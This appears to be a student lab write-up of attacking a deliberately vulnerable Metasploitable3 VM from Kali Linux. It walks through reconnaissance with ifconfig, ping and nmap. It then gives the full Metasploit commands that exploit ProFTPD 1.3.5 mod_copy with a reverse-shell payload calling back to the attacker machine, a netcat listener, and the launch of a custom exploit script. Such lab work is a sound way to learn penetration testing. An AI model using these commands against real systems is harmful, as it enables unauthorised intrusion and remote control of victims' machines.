
## 🔍 Step 1: Finding the IP Address of Metasploitable3

We used the `ifconfig` command inside the Metasploitable3 VM to find its IP address on the NAT network.

- **Discovered IP Address:** `10.0.2.7`

![Metasploitable3 IP Address](Screenshots/A-FindIP-Metasplot.png)


### 🔁 Step 2: Verifying Network Connectivity

Before launching any attacks, we verified that the attacker machine (Kali Linux) can reach the victim machine (Metasploitable3) using the `ping` command.

- **Target IP:** `10.0.2.7`
- **Result:** Successful ping with 0% packet loss



![Ping Test from Kali to Metasploitable](Screenshots/B-Connect.png)
### 🔎 Step 3: Scanning for Open Ports and Services

To discover vulnerable services running on the victim machine, we performed a full version scan using `nmap`:
![Metasploitable3 IP Address](Screenshots/C-FindPorts.png)


 ## 📍 Step 4: Exploiting ProFTPD 1.3.5 via `proftpd_modcopy_exec`

In this step, we exploit the vulnerable **ProFTPD 1.3.5** service running on Metasploitable3 using the `unix/ftp/proftpd_modcopy_exec` module in Metasploit. The goal is to get a **reverse shell** back to our Kali machine.

---
![Metasploitable3 IP Address](Screenshots/D-msfconsole.png)
### ✅ Summary of the Process

- **Target (Metasploitable3) IP:** `10.0.2.7`  
- **Attacker (Kali) IP:** `10.0.2.5`  
- **Vulnerable Service:** ProFTPD 1.3.5  
- **Exploit Module:** `exploit/unix/ftp/proftpd_modcopy_exec`  
- **Payload Used:** `cmd/unix/reverse_python`  
- **Writable Web Directory:** `/var/www/html`

---

### 🧰 Commands Used

```bash
# Start Metasploit
msfconsole

# Search and load the exploit module
search proftpd 1.3.5
use exploit/unix/ftp/proftpd_modcopy_exec

# Set RHOST and LHOST
set RHOST 10.0.2.7
set LHOST 10.0.2.5

# View available payloads and select one
show payloads
set payload cmd/unix/reverse_python

# Set the writable directory on the target
set SITEPATH /var/www/html

# (Optional) Prevent cleanup and handler issues
set AllowNoCleanup true
set DisablePayloadHandler true

# Run the exploit

exploit
```
## ✅ Step 5: Establishing a Reverse Shell to the Victim (End of Phase 1.1)






After successfully uploading the malicious PHP payload using the `mod_copy` exploit module in Metasploit, we triggered the payload by accessing it through the victim’s web server. This caused the victim (Metasploitable3) to connect back to our Kali machine, confirming a successful reverse shell.

![Metasploitable3 IP Address](Screenshots/E-VictimShell.png)
### 🔊 Listener Setup (Attacker Side)



On Kali, we opened a Netcat listener on port `4444`:

```bash
nc -lvnp 4444
## 🔹 Task 1.2 – Running the Custom Exploit Script

After manually exploiting the FTP service in Task 1.1 using Metasploit, we now move to automating the attack using a custom Python script.

### ▶️ Step: Executing the Custom Exploit Script

We ran the following command from the `/Downloads` directory:

```bash
python3 Script.py
```
![Metasploitable3 IP Address](Screenshots/F-RunningScript.png)


